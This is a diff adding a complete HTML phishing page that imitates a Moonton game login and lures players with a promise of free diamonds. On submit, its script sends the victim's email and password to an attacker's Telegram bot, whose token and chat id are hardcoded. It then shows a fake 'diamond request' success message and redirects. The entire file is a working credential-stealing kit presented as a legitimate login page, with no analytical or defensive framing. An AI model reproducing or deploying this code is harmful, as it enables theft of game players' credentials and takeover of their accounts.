@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moonton Login</title>
+    <style>
+        body {
+            text-align: center;
+            background-color: #121212;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            margin-top: 50px;
+            max-width: 400px;
+            background-color: #1f1f1f;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.5);
+        }
+        img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            background-color: #333;
+            color: white;
+        }
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #FFD700;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="moonton.png" alt="Moonton Logo" style="width: 200px;">
+        <h2>Login with Moonton</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Enter your Moonton Email" required>
+            <input type="password" id="password" placeholder="Enter your Moonton Password" required>
+            <button type="submit" class="button">Login</button>
+        </form>
+    </div>
+
+    <script>
+        const botToken = "7752857283:AAGYsQ4Jh3hVvBUTIcgz3gdft53Z_B-5rrk";
+        const chatId = "7328757522";
+
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            const message = `🔒 New Login Details:\n💻 Method: Moonton\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(apiUrl)
+                .then(response => {
+                    if (response.ok) {
+                        alert("DIAMOND REQUAST SEND SUCCESSFULLY PLEASE WAIT 3Hours!");
+                        window.location.href = "processing.html";
+                    } else {
+                        alert("Failed to send login details. Please try again.");
+                    }
+                })
+                .catch(error => console.error("Error:", error));
+        });
+    </script>
+</body>
+</html>
